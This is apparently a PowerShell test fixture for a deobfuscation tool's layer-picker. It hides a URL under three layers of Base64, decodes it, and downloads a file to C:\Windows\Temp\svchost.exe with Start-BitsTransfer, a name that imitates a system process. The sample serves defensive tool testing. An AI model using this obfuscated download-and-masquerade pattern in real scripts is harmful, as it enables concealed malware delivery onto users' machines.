# Triple Base64 encoding: 3 layers deep hiding a malicious URL
# This exercises the Deobfuscation layer-picker (▾) menu — each Base64
# layer is a pickable entry so the analyst can jump to any depth.

$payload = "WVVoU01HTkViM1pNTWpGb1lraGthR050VlhWYVdHaG9ZbGhDYzFwVE5YWmpiV04yWXpOU2FGb3lWWHBNTWxKNVlqTkNkMXBZU1hWYVdHaHM="
# Decode layer 1
$l1 = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($payload))
# Decode layer 2
$l2 = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($l1))
# Decode layer 3 - final URL
$url = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($l2))
Start-BitsTransfer -Source $url -Destination C:\Windows\Temp\svchost.exe
